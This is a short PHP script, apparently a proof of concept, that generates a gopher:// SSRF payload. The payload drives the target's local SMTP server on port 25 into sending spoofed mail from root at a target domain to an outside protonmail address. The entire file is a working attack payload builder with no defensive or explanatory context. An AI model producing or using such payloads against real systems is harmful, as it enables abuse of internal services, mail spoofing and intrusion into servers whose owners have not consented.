<?php
        $commands = array(
                'HELO target.0xff.web.id',
                'MAIL FROM: <root@target.0xff.web.id>',
                'RCPT TO: <r4m@protonmail.com>',
                'DATA',
                'Subject: SSRF HERE',
                'SSRF AND SMTP',
                '.'
        );
        $payload = implode('%0A', $commands);
        echo 'gopher://127.0.0.1:25/_' . $payload;
?>
